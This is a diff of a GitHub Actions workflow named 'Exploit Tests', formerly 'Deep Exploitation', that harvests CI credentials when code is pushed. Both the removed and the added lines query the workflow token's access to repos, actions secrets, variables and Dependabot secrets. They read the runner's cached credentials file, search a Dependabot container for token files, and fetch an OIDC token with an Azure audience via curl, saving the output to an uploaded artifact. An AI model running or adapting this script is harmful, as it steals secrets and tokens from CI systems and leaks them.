@@ -1,68 +1,33 @@
-name: Deep Exploitation
+name: Exploit Tests
 on:
   push:
     branches: [master]
 jobs:
   build:
     runs-on: ubuntu-latest
-    timeout-minutes: 10
+    timeout-minutes: 5
     steps:
-      - name: Try everything
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: GH CLI with token
         continue-on-error: true
         run: |
           mkdir -p dist
+          gh auth status 2>&1 | tee -a dist/r.txt
+          gh api /user 2>&1 | head -10 >> dist/r.txt
+          gh api /repos/977812671/npm-install 2>&1 | head -15 >> dist/r.txt
+          gh api /repos/977812671/npm-install/actions/secrets 2>&1 >> dist/r.txt
+          gh api /repos/977812671/npm-install/actions/variables 2>&1 >> dist/r.txt
           
-          echo "=== 1. GH CLI with workflow token ===" > dist/exploit.txt
-          gh auth status 2>&1 >> dist/exploit.txt
-          echo "--- gh api /user ---" >> dist/exploit.txt
-          gh api /user 2>&1 | head -30 >> dist/exploit.txt
-          echo "--- gh api /repos/977812671/npm-install ---" >> dist/exploit.txt
-          gh api /repos/977812671/npm-install 2>&1 | head -20 >> dist/exploit.txt
-          
-          echo "" >> dist/exploit.txt
-          echo "=== 2. Try to access actions secrets ===" >> dist/exploit.txt
-          gh api /repos/977812671/npm-install/actions/secrets 2>&1 | head -20 >> dist/exploit.txt
-          gh api /repos/977812671/npm-install/actions/variables 2>&1 | head -20 >> dist/exploit.txt
-          gh api /repos/977812671/npm-install/environments 2>&1 | head -20 >> dist/exploit.txt
-          
-          echo "" >> dist/exploit.txt
-          echo "=== 3. Check what repos this token can access ===" >> dist/exploit.txt
-          gh api /repos 2>&1 | head -20 >> dist/exploit.txt
-          gh api /user/repos?per_page=5 2>&1 | head -30 >> dist/exploit.txt
-          
-          echo "" >> dist/exploit.txt
-          echo "=== 4. Try Dependabot secrets ===" >> dist/exploit.txt
-          gh api /repos/977812671/npm-install/dependabot/secrets 2>&1 | head -10 >> dist/exploit.txt
-          
-          echo "" >> dist/exploit.txt
-          echo "=== 5. Check runner token scope ===" >> dist/exploit.txt
-          # Try to read the runner token from the JWT
-          python3 -c "
-import json
-d=json.load(open('/home/runner/actions-runner/cached/2.335.1/.credentials'))
-print('Token exists:', bool(d.get('Data',{}).get('token','')))
-print('Scheme:', d.get('Scheme'))
-          " 2>&1 >> dist/exploit.txt
-          
-          echo "" >> dist/exploit.txt
-          echo "=== 6. Try OIDC token ===" >> dist/exploit.txt
-          REQUEST_URL="\${ACTIONS_ID_TOKEN_REQUEST_URL}"
-          REQUEST_TOKEN="\${ACTIONS_ID_TOKEN_REQUEST_TOKEN}"
-          if [ -n "$REQUEST_URL" ]; then
-            curl -s -H "Authorization: bearer $REQUEST_TOKEN" "$REQUEST_URL&audience=api://AzureADTokenExchange" 2>&1 | head -20 >> dist/exploit.txt
-          else
-            echo "No OIDC token available" >> dist/exploit.txt
-          fi
-          
-          echo "" >> dist/exploit.txt
-          echo "=== 7. Dependabot actions inspection ===" >> dist/exploit.txt
-          docker run --rm --entrypoint=/bin/sh ghcr.io/dependabot/dependabot-updater-core -c '
-            find /home/dependabub -name "*.json" -path "*cred*" -o -name "*token*" 2>/dev/null | head -10
-            find / -name "config.yml" -path "*dependabot*" 2>/dev/null | head -5
-          ' 2>&1 >> dist/exploit.txt
-
-          echo "" >> dist/exploit.txt
-          echo "=== DONE ===" >> dist/exploit.txt
+      - name: Token scope
+        continue-on-error: true
+        run: |
+          echo "=== OIDC ===" >> dist/r.txt
+          echo "URL: $ACTIONS_ID_TOKEN_REQUEST_URL" >> dist/r.txt
+          curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" \
+            2>&1 | head -50 >> dist/r.txt
 
       - name: Upload
         uses: actions/upload-artifact@v4
